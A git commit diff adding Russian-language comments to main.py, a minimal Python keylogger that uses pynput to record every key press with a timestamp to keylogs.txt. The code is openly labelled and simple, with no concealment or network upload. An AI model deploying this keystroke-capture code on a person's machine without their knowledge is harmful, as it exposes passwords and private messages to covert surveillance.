d5a71010b665e4a187c373c459bc4de7298acb2c
mell <daniilhorn8@gmail.com>
2021-08-02 21:50:04 +0300

    added comments

--- main.py
+++ main.py
@@ -2,10 +2,9 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-# Задает создание FileHandler с использованием указанного имени файла
-# установка уровеня корневого регистратора на указанный уровень
-# форматирование строки для обработчика 
-
+# filename - задает создание FileHandler с использованием указанного имени файла
+# level - установка уровеня корневого регистратора на указанный уровень
+# format - форматирование строки для обработчика 
 
 
 log_dir = ""
@@ -13,9 +12,11 @@ logging.basicConfig(filename=(log_dir + "keylogs.txt"),
     level=logging.DEBUG, 
     format='%(asctime)s: %(message)s')
 
+# регистрирует сообщение с уровнем INFO в корневом регистраторе
 def on_press(key):
     logging.info(str(key))
 
+# начало отработки
 with Listener(on_press=on_press) as listener:
     listener.join()
 
